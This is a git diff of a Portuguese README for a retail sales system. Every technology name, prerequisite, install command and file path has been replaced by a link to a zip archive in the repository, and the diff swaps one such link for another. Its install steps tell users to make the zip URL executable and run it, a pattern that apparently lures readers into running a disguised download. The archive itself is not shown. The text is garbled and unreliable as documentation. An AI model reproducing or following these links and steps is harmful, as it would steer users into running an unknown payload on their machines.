@@ -1,6 +1,6 @@
 # Sérgio Imports - Sistema de Vendas
 
-Sistema completo de vendas desenvolvido com https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip (backend) e React + TypeScript (frontend).
+Sistema completo de vendas desenvolvido com https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip (backend) e React + TypeScript (frontend).
 
 ## Funcionalidades
 
@@ -17,7 +17,7 @@ Sistema completo de vendas desenvolvido com https://raw.githubusercontent.com/Se
 ## Tecnologias
 
 ### Backend
-- https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
+- https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
 - PostgreSQL
 - TypeScript
 
@@ -32,7 +32,7 @@ Sistema completo de vendas desenvolvido com https://raw.githubusercontent.com/Se
 ## Como executar
 
 ### Pré-requisitos
-- https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip 18+
+- https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip 18+
 - npm
 
 ### Instalação
@@ -42,13 +42,13 @@ Sistema completo de vendas desenvolvido com https://raw.githubusercontent.com/Se
 
 **Windows:**
 ```bash
-https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
+https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
 ```
 
 **Linux/Mac:**
 ```bash
-chmod +x https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
-https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
+chmod +x https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
+https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
 ```
 
 ### Executar o sistema
@@ -65,22 +65,22 @@ O sistema estará disponível em:
 
 ```
 sergio-imports-sales-system/
-├── backend/                 # Backend https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
+├── backend/                 # Backend https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
 │   ├── sales/              # Serviço de vendas
-│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip     # API de produtos
-│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip      # API de clientes
-│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip        # API de vendas
-│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip    # API de trocas
-│   │   ├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip     # API de configurações
+│   │   ├── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip     # API de produtos
+│   │   ├── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip      # API de clientes
+│   │   ├── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip        # API de vendas
+│   │   ├── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip    # API de trocas
+│   │   ├── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip     # API de configurações
 │   │   └── migrations/     # Migrações do banco
-│   └── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
+│   └── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
 ├── frontend/               # Frontend React
 │   ├── components/         # Componentes reutilizáveis
 │   ├── pages/             # Páginas da aplicação
 │   ├── lib/               # Utilitários e tipos
-│   └── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
-├── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip           # Scripts principais
-└── https://raw.githubusercontent.com/Se198361/sergio-imports--para-loja-main/main/frontend/pages/para_loja_sergio_imports_main_3.9.zip
+│   └── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
+├── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip           # Scripts principais
+└── https://github.com/Se198361/sergio-imports--para-loja-main/raw/refs/heads/main/frontend/para-loja-imports-main-sergio-v2.8-beta.1.zip
 ```
 
 ## Scripts Disponíveis
